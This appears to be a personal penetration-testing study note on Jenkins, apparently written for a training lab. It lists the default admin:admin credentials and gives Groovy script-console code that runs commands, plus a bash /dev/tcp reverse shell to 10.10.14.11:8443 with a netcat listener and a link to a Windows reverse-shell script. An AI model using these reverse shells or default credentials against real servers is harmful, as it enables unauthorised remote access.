---
aliases:
tags:
source:
desc: Jenkins is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat
---


# discovery
- runs on [[apache-tomcat]] port 8080 by default
- distinctive login screen
  ![[assets/attachments/kb/tools/jenkins/image.png]]
- port 5000 is used to communicate between masters and slave servers
- Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. 
- Administrators can also allow or disallow users from creating accounts.
- default creds
	- `admin:admin`

# enumerate


# attack

- via the script console `http://jenkins.inlanefreight.local:8000/script` #language/groovy
	- open script console
		- execute command
		```groovy
		def cmd = 'id'
		def sout = new StringBuffer(), serr = new StringBuffer()
		def proc = cmd.execute()
		proc.consumeProcessOutput(sout, serr)
		proc.waitForOrKill(1000)
		println sout
		```
		![[groovy_web.png]]
		- reverse shell
		  ```groovy
		r = Runtime.getRuntime()
		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.11/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
		p.waitFor()
			```
			- catch `nc -lvnp 8443`
	- windows host
		- open script console
			- execute command
			  ```groovy
				def cmd = "cmd.exe /c dir".execute();
				println("${cmd.text}");
				```
			- reverse shell in groovy
				- change localhost to kali ip
				- `https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy`
	  ```
		  


# exploit


